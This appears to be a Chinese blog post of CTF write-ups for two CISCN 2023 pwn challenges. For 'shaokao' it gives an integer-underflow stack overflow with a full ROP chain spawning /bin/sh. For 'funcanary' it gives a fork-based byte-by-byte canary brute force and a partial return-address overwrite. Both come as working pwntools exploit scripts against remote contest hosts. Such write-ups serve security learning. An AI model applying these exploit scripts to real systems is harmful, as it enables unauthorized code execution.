        <content type="html"><![CDATA[<blockquote><p>坐牢了，只会做baby题</p></blockquote><h1 id="shaokao"><a href="#shaokao" class="headerlink" title="shaokao"></a>shaokao</h1><p>整型下溢，然后有个栈溢出，直接用ROPgadget生成ropchain</p><p><img src="/../img/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3.assets/image-20230528173718539.png" alt="image-20230528173718539"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;123.56.251.120&quot;</span></span><br><span class="line">port = <span class="number">36293</span></span><br><span class="line"><span class="comment">#pl = process(&quot;./shaokao&quot;)</span></span><br><span class="line">pl = remote(host,  port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line">pl.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line">pl.sendline(<span class="string">&quot;-1145144&quot;</span>)</span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="string">b&quot;a&quot;</span>*<span class="number">40</span></span><br><span class="line"></span><br><span class="line">p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += p64(<span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += p64(<span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += p64(<span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line">pl.sendline(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pl.interactive()</span><br></pre></td></tr></table></figure><h1 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h1><p>fork子进程崩溃不改变canary,利用该性质逐字节爆破canary,发现后门函数，直接覆盖前两位地址，第三位直接猜</p><p><img src="/../img/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3.assets/image-20230528173814568.png" alt="image-20230528173814568"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;123.57.248.214&quot;</span></span><br><span class="line">port = <span class="number">25775</span></span><br><span class="line"><span class="comment">#pt = process(&quot;./funcanary&quot;)</span></span><br><span class="line">pt = remote(host, port)</span><br><span class="line"></span><br><span class="line">pt.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;the &quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="built_in">chr</span>(i)</span><br><span class="line">        pt.send(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary + <span class="built_in">chr</span>(i))</span><br><span class="line">        a = pt.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> a</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;fun&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">                canary += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;canary: &quot;</span> + canary</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;canary: &quot;</span> + canary</span><br><span class="line"></span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x02&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x12&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x22&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x32&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x42&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x52&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x62&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x72&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x82&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x92&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xa2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xb2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xc2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xd2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xe2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xf2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pt.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
